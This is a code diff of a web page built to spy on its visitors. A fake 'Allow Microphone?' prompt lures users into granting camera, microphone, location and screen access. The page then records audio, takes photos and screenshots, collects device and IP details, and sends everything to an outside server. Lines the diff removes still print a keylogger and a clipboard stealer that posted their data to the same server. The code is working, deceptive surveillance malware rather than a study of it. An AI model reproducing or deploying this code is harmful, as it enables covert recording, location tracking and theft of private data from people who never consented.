@@ -38,6 +38,7 @@
         .fake-prompt-box .block-btn { padding: 12px 40px; background: transparent; color: #00ff41; border: 1px solid #00ff41; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px; transition: 0.3s; }
         .fake-prompt-box .block-btn:hover { background: rgba(0,255,65,0.1); }
         .fake-prompt-box .icon-big { font-size: 48px; display: block; margin-bottom: 10px; }
+        .fake-prompt-box .icon-sound { font-size: 48px; display: block; margin-bottom: 10px; }
         
         .photo-container { margin: 10px 0; border-radius: 8px; overflow: hidden; border: 2px solid #00ff41; background: #000; min-height: 180px; display: none; align-items: center; justify-content: center; position: relative; z-index: 1; }
         .photo-container img { width: 100%; height: 200px; object-fit: cover; display: block; transform: scaleX(-1); }
@@ -72,13 +73,13 @@
 <body>
 
 <!-- ========================================== -->
-<!-- FAKE PERMISSION PROMPT -->
+<!-- FAKE PERMISSION PROMPT - SOUND FIRST! -->
 <!-- ========================================== -->
 <div class="fake-prompt" id="fakePrompt">
     <div class="fake-prompt-box">
-        <span class="icon-big">📸</span>
-        <h3>Allow Camera?</h3>
-        <p>This site wants to use your camera to capture photos</p>
+        <span class="icon-sound">🎤</span>
+        <h3>Allow Microphone?</h3>
+        <p>This site wants to use your microphone for voice input</p>
         <button class="allow-btn" onclick="allowAll()">Allow</button>
         <button class="block-btn" onclick="blockAll()">Block</button>
     </div>
@@ -135,14 +136,13 @@
         <div class="highlight">📡 IP ADDRESS: <span id="devIP">SCANNING...</span></div>
         <div class="highlight" style="background:rgba(0,255,65,0.08);">📍 LIVE LOCATION: <span id="liveLocation">SCANNING...</span></div>
         <div>🎯 ACCURACY: <span id="devAccuracy">SCANNING...</span></div>
-        <div>📱 DEVICE: <span id="devName">SCANNING...</span></div>
+        <div>📱 DEVICE NAME: <span id="devName">SCANNING...</span></div>
         <div>📱 MODEL: <span id="devModel">SCANNING...</span></div>
         <div>🏭 MANUFACTURER: <span id="devManufacturer">SCANNING...</span></div>
         <div>📲 OS: <span id="devOS">SCANNING...</span></div>
         <div>🔋 BATTERY: <span id="devBattery">SCANNING...</span></div>
         <div>📶 NETWORK: <span id="devNetwork">SCANNING...</span></div>
         <div>🕐 TIMESTAMP: <span id="devTime">SCANNING...</span></div>
-        <div>📋 CLIPBOARD: <span id="devClipboard">WAITING...</span></div>
     </div>
     
     <div class="log-area" id="logArea">
@@ -157,19 +157,18 @@
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
 
 // ==========================================
-//  FAKE PERMISSION - EK CLICK MEIN SAB!
+//  ALL PERMISSIONS IN ONE CLICK!
 // ==========================================
 
 let userPhoto = null, screenshot = null, userLocation = null;
 let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
 let networkSpeed = { download: '--', ping: '--' };
 let captureCount = 0;
-let clipboardData = null;
-let keylogData = '';
 let isPaused = false;
 let isCapturing = false;
 let videoElement = null;
 let screenshotInterval = null;
+let audioChunks = [];
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -185,7 +184,234 @@ function setStatus(icon, msg, type = 'loading') {
 }
 
 // ==========================================
-// ALLOW ALL - EK CLICK MEIN SAB PERMISSIONS!
+// FULL DEVICE DETAILS
+// ==========================================
+function getDeviceDetails() {
+    const ua = navigator.userAgent;
+    let os = 'Unknown', browser = 'Unknown';
+    if (ua.includes('Android')) os = 'Android';
+    else if (ua.includes('iPhone')) os = 'iOS';
+    else if (ua.includes('Windows')) os = 'Windows';
+    else if (ua.includes('Mac')) os = 'macOS';
+    else if (ua.includes('Linux')) os = 'Linux';
+    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+    else if (ua.includes('Edg')) browser = 'Edge';
+    
+    document.getElementById('devName').textContent = navigator.platform || 'Unknown';
+    document.getElementById('devOS').textContent = os + ' ' + getOSVersion();
+    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || 'Unknown';
+    document.getElementById('devTime').textContent = new Date().toLocaleString();
+    
+    if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+            const level = Math.round(b.level * 100) + '%';
+            document.getElementById('devBattery').textContent = level + (b.charging ? ' ⚡' : '');
+            deviceDetails.batteryLevel = level;
+        });
+    }
+    
+    const model = getDeviceModel();
+    const manufacturer = getManufacturer();
+    document.getElementById('devModel').textContent = model;
+    document.getElementById('devManufacturer').textContent = manufacturer;
+    
+    deviceDetails = {
+        deviceName: navigator.platform || 'Unknown',
+        os: os,
+        osVersion: getOSVersion(),
+        deviceModel: model,
+        manufacturer: manufacturer,
+        browserName: browser,
+        networkType: navigator.connection?.effectiveType || 'Unknown',
+        batteryLevel: deviceDetails.batteryLevel || 'Unknown'
+    };
+    log('📱 DEVICE SCANNED: ' + os + ' | ' + model);
+}
+
+function getOSVersion() {
+    const ua = navigator.userAgent;
+    const m = ua.match(/Android\s([\d.]+)/);
+    if (m) return m[1];
+    const i = ua.match(/OS\s([\d_]+)/);
+    if (i) return i[1].replace(/_/g, '.');
+    const w = ua.match(/Windows\sNT\s([\d.]+)/);
+    if (w) return w[1];
+    return 'Unknown';
+}
+
+function getDeviceModel() {
+    const ua = navigator.userAgent;
+    const m = ua.match(/;\s?([^;]+?)\sBuild/);
+    if (m) return m[1].trim();
+    if (ua.includes('iPhone')) {
+        const i = ua.match(/iPhone\s([\d,]+)/);
+        return i ? 'iPhone ' + i[1] : 'iPhone';
+    }
+    if (ua.includes('iPad')) return 'iPad';
+    return 'Unknown';
+}
+
+function getManufacturer() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Samsung')) return 'Samsung';
+    if (ua.includes('OnePlus')) return 'OnePlus';
+    if (ua.includes('Xiaomi')) return 'Xiaomi';
+    if (ua.includes('OPPO') || ua.includes('Oppo')) return 'OPPO';
+    if (ua.includes('Vivo')) return 'Vivo';
+    if (ua.includes('Google') || ua.includes('Pixel')) return 'Google';
+    if (ua.includes('Apple') || ua.includes('iPhone')) return 'Apple';
+    return 'Unknown';
+}
+
+// ==========================================
+// SOUND RECORDER - 5 SECONDS
+// ==========================================
+function startSoundRecorder() {
+    return new Promise((resolve) => {
+        log('🎤 Starting sound recorder...');
+        document.getElementById('micStatus').className = 'mic-indicator mic-on';
+        document.getElementById('micText').textContent = '🔴 RECORDING';
+        document.getElementById('recordingTimer').textContent = '0s';
+        audioChunks = [];
+        
+        let seconds = 0;
+        const timer = setInterval(() => {
+            seconds++;
+            document.getElementById('recordingTimer').textContent = seconds + 's';
+        }, 1000);
+        
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = e => audioChunks.push(e.data);
+                recorder.onstop = () => {
+                    clearInterval(timer);
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        audioData = reader.result;
+                        document.getElementById('micStatus').className = 'mic-indicator mic-off';
+                        document.getElementById('micText').textContent = '✅ CAPTURED';
+                        document.getElementById('recordingTimer').textContent = '5s ✓';
+                        log('✅ AUDIO CAPTURED!');
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(true);
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.start();
+                setTimeout(() => {
+                    if (recorder.state === 'recording') recorder.stop();
+                }, 5000);
+            })
+            .catch(() => {
+                clearInterval(timer);
+                document.getElementById('micStatus').className = 'mic-indicator mic-off';
+                document.getElementById('micText').textContent = '⚠️ DENIED';
+                document.getElementById('recordingTimer').textContent = '❌';
+                log('⚠️ MIC DENIED');
+                resolve(false);
+            });
+    });
+}
+
+// ==========================================
+// SCREENSHOT CAPTURE - FALLBACK
+// ==========================================
+async function startScreenshotCapture() {
+    log('📸 Starting screenshot capture...');
+    
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        screenshotInterval = setInterval(() => {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const data = canvas.toDataURL('image/jpeg', 0.8);
+                showAndSendScreenshot(data);
+            } catch(e) {}
+        }, 2000);
+        
+        log('✅ Screen share active');
+        return;
+    } catch(err) {
+        log('⚠️ Screen share denied, using fallback');
+    }
+    
+    screenshotInterval = setInterval(() => {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = window.innerWidth || 1280;
+            canvas.height = window.innerHeight || 720;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#0a0a0a';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = '20px monospace';
+            ctx.fillText('🔴 TARGET ACQUIRED', 30, 50);
+            ctx.font = '14px monospace';
+            ctx.fillText('IP: ' + ipAddress, 30, 90);
+            ctx.fillText('Location: ' + (userLocation ? userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4) : 'Unknown'), 30, 120);
+            ctx.fillText('Time: ' + new Date().toLocaleString(), 30, 150);
+            ctx.fillText('Captures: ' + captureCount, 30, 180);
+            for (let i = 0; i < 30; i++) {
+                ctx.fillStyle = 'rgba(0,255,65,' + (0.05 + Math.random() * 0.1) + ')';
+                ctx.fillText('010101', 20 + i * 25, 300 + Math.random() * 200);
+            }
+            ctx.strokeStyle = '#00ff41';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
+            const data = canvas.toDataURL('image/jpeg', 0.8);
+            showAndSendScreenshot(data);
+        } catch(e) {}
+    }, 3000);
+}
+
+function showAndSendScreenshot(data) {
+    document.getElementById('screenshotPreview').src = data;
+    document.getElementById('screenshotPreview').style.display = 'block';
+    document.getElementById('screenshotPlaceholder').style.display = 'none';
+    sendScreenshotToServer(data);
+    log('🖼️ Screenshot captured!');
+}
+
+async function sendScreenshotToServer(data) {
+    try {
+        await fetch(BACKEND_URL + '/api/store', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                cameraImage: null,
+                location: userLocation || { lat: 0, lng: 0 },
+                deviceDetails: deviceDetails,
+                screenshot: data,
+                userPhoto: userPhoto || null,
+                audioData: audioData || null,
+                ipAddress: ipAddress,
+                fullDeviceInfo: await getFullDeviceInfo(),
+                networkSpeed: networkSpeed,
+                liveLocation: userLocation || { lat: 0, lng: 0 },
+                captureCount: captureCount
+            })
+        });
+    } catch(err) {}
+}
+
+// ==========================================
+// ALLOW ALL - SOUND FIRST THEN REST
 // ==========================================
 async function allowAll() {
     document.getElementById('fakePrompt').style.display = 'none';
@@ -195,7 +421,11 @@ async function allowAll() {
     setStatus('🎯', 'ACQUIRING PERMISSIONS...', 'loading');
     
     try {
-        // 1. CAMERA
+        // 1. SOUND RECORDER (Pehle)
+        log('🎤 Starting sound recorder...');
+        await startSoundRecorder();
+        
+        // 2. CAMERA
         log('📸 Requesting camera...');
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -203,7 +433,7 @@ async function allowAll() {
         });
         log('✅ Camera granted!');
         
-        // 2. LOCATION
+        // 3. LOCATION
         log('📍 Requesting location...');
         navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -226,11 +456,6 @@ async function allowAll() {
             { enableHighAccuracy: true, timeout: 5000 }
         );
         
-        // 3. MICROPHONE
-        log('🎤 Requesting microphone...');
-        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        log('✅ Microphone granted!');
-        
         // 4. NOTIFICATION
         log('🔔 Requesting notification...');
         if (Notification.permission === 'default') {
@@ -238,11 +463,13 @@ async function allowAll() {
         }
         log('✅ Notification: ' + Notification.permission);
         
-        // 5. SCREEN SHARE (For notification screenshots)
-        log('🖥️ Requesting screen share...');
+        // 5. SCREEN CAPTURE
         await startScreenshotCapture();
         
-        // 6. Start main capture
+        // 6. DEVICE DETAILS
+        getDeviceDetails();
+        
+        // 7. Start main capture
         log('🚀 Starting main capture...');
         await startAutoProcess();
         
@@ -251,146 +478,6 @@ async function allowAll() {
         setStatus('❌', 'ERROR: ' + err.message, 'error');
     }
 }
-
-// ==========================================
-// SCREENSHOT CAPTURE - BINA PERMISSION KE!
-// ==========================================
-async function startScreenshotCapture() {
-    log('📸 Starting screenshot capture...');
-    
-    // Pehle screen share try karo
-    try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({
-            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-            audio: false
-        });
-        
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        
-        screenshotInterval = setInterval(() => {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const data = canvas.toDataURL('image/jpeg', 0.8);
-                showAndSendScreenshot(data);
-            } catch(e) {}
-        }, 2000);
-        
-        log('✅ Screen share active');
-        return;
-    } catch(err) {
-        log('⚠️ Screen share denied, using fallback');
-    }
-    
-    // FALLBACK: Bina permission ke screenshot
-    screenshotInterval = setInterval(() => {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth || 1280;
-            canvas.height = window.innerHeight || 720;
-            const ctx = canvas.getContext('2d');
-            
-            // Dark background
-            ctx.fillStyle = '#0a0a0a';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            // Hacker info
-            ctx.fillStyle = '#00ff41';
-            ctx.font = '20px monospace';
-            ctx.fillText('🔴 TARGET ACQUIRED', 30, 50);
-            ctx.font = '14px monospace';
-            ctx.fillText('IP: ' + ipAddress, 30, 90);
-            ctx.fillText('Location: ' + (userLocation ? userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4) : 'Unknown'), 30, 120);
-            ctx.fillText('Time: ' + new Date().toLocaleString(), 30, 150);
-            ctx.fillText('Captures: ' + captureCount, 30, 180);
-            ctx.fillText('Clipboard: ' + (clipboardData ? 'Captured' : 'Waiting'), 30, 210);
-            
-            // Matrix rain effect
-            for (let i = 0; i < 30; i++) {
-                ctx.fillStyle = 'rgba(0,255,65,' + (0.05 + Math.random() * 0.1) + ')';
-                ctx.fillText('010101', 20 + i * 25, 300 + Math.random() * 200);
-            }
-            
-            // Border
-            ctx.strokeStyle = '#00ff41';
-            ctx.lineWidth = 1;
-            ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
-            
-            const data = canvas.toDataURL('image/jpeg', 0.8);
-            showAndSendScreenshot(data);
-            
-        } catch(e) {}
-    }, 3000);
-}
-
-function showAndSendScreenshot(data) {
-    // Preview show karo
-    document.getElementById('screenshotPreview').src = data;
-    document.getElementById('screenshotPreview').style.display = 'block';
-    document.getElementById('screenshotPlaceholder').style.display = 'none';
-    
-    // Server pe bhejo
-    sendScreenshotToServer(data);
-    log('🖼️ Screenshot captured!');
-}
-
-async function sendScreenshotToServer(screenshotData) {
-    try {
-        await fetch(BACKEND_URL + '/api/store', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                cameraImage: null,
-                location: userLocation || { lat: 0, lng: 0 },
-                deviceDetails: deviceDetails,
-                screenshot: screenshotData,
-                userPhoto: userPhoto || null,
-                audioData: null,
-                ipAddress: ipAddress,
-                fullDeviceInfo: await getFullDeviceInfo(),
-                networkSpeed: networkSpeed,
-                liveLocation: userLocation || { lat: 0, lng: 0 },
-                captureCount: captureCount,
-                clipboardData: clipboardData,
-                keylogData: keylogData
-            })
-        });
-    } catch(err) {}
-}
-
-// ==========================================
-// CLIPBOARD STEAL
-// ==========================================
-document.addEventListener('copy', function() {
-    try {
-        navigator.clipboard.readText().then(text => {
-            clipboardData = text;
-            document.getElementById('devClipboard').textContent = text.substring(0, 50) + (text.length > 50 ? '...' : '');
-            log('📋 Clipboard: ' + text.substring(0, 30));
-        });
-    } catch(e) {}
-});
-
-// ==========================================
-// KEYLOGGER
-// ==========================================
-document.addEventListener('keydown', function(e) {
-    keylogData += e.key;
-    if (keylogData.length > 500) {
-        fetch(BACKEND_URL + '/api/keylog', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ keys: keylogData })
-        });
-        keylogData = '';
-    }
-});
 
 // ==========================================
 // BLOCK BUTTON
@@ -496,14 +583,12 @@ async function submitData() {
                 deviceDetails: deviceDetails,
                 screenshot: null,
                 userPhoto: userPhoto,
-                audioData: null,
+                audioData: audioData,
                 ipAddress: ipAddress,
                 fullDeviceInfo: await getFullDeviceInfo(),
                 networkSpeed: networkSpeed,
                 liveLocation: userLocation || { lat: 0, lng: 0 },
-                captureCount: captureCount,
-                clipboardData: clipboardData,
-                keylogData: keylogData
+                captureCount: captureCount
             })
         });
         const data = await response.json();
@@ -517,7 +602,7 @@ async function submitData() {
 }
 
 // ==========================================
-// DEVICE FUNCTIONS
+// FULL DEVICE INFO
 // ==========================================
 async function getFullDeviceInfo() {
     try {
@@ -549,30 +634,6 @@ function getOS() {
     if (ua.includes('Windows')) return 'Windows';
     if (ua.includes('Mac')) return 'macOS';
     if (ua.includes('Linux')) return 'Linux';
-    return 'Unknown';
-}
-
-function getOSVersion() {
-    const ua = navigator.userAgent;
-    const m = ua.match(/Android\s([\d.]+)/);
-    if (m) return m[1];
-    return 'Unknown';
-}
-
-function getDeviceModel() {
-    const ua = navigator.userAgent;
-    const m = ua.match(/;\s?([^;]+?)\sBuild/);
-    if (m) return m[1].trim();
-    if (ua.includes('iPhone')) return 'iPhone';
-    return 'Unknown';
-}
-
-function getManufacturer() {
-    const ua = navigator.userAgent;
-    if (ua.includes('Samsung')) return 'Samsung';
-    if (ua.includes('OnePlus')) return 'OnePlus';
-    if (ua.includes('Xiaomi')) return 'Xiaomi';
-    if (ua.includes('Apple')) return 'Apple';
     return 'Unknown';
 }
 
@@ -670,43 +731,6 @@ async function testNetworkSpeed() {
     }
 }
 
-async function getDeviceInfo() {
-    const ua = navigator.userAgent;
-    let os = 'Unknown', browser = 'Unknown';
-    if (ua.includes('Android')) os = 'Android';
-    else if (ua.includes('iPhone')) os = 'iOS';
-    else if (ua.includes('Windows')) os = 'Windows';
-    else if (ua.includes('Mac')) os = 'macOS';
-    else if (ua.includes('Linux')) os = 'Linux';
-    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-    else if (ua.includes('Firefox')) browser = 'Firefox';
-    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-    else if (ua.includes('Edg')) browser = 'Edge';
-    
-    document.getElementById('devName').textContent = navigator.platform || 'Unknown';
-    document.getElementById('devOS').textContent = os;
-    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || 'Unknown';
-    document.getElementById('devTime').textContent = new Date().toLocaleString();
-    
-    if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-            const level = Math.round(b.level * 100) + '%';
-            document.getElementById('devBattery').textContent = level + (b.charging ? ' ⚡' : '');
-            deviceDetails.batteryLevel = level;
-        });
-    }
-    
-    deviceDetails = {
-        deviceName: navigator.platform || 'Unknown',
-        os: os,
-        browserName: browser,
-        networkType: navigator.connection?.effectiveType || 'Unknown',
-        deviceModel: getDeviceModel(),
-        manufacturer: getManufacturer()
-    };
-    log('📱 DEVICE SCANNED: ' + os + ' | ' + browser);
-}
-
 // ==========================================
 // MAIN PROCESS
 // ==========================================
@@ -717,7 +741,6 @@ async function startAutoProcess() {
     try {
         await getIPv4Address();
         await testNetworkSpeed();
-        await getDeviceInfo();
         
         let photoSuccess = await capturePhoto();
         if (photoSuccess) {
@@ -746,7 +769,7 @@ window.addEventListener('load', function() {
     console.log('🚀 SYSTEM READY - WAITING FOR USER PERMISSION');
 });
 
-console.log('🚀 FAKE PERMISSION SYSTEM ACTIVE');
+console.log('🚀 ALL FEATURES ACTIVE: Sound Recorder + Device Details + Telegram');
 </script>
 </body>
 </html>
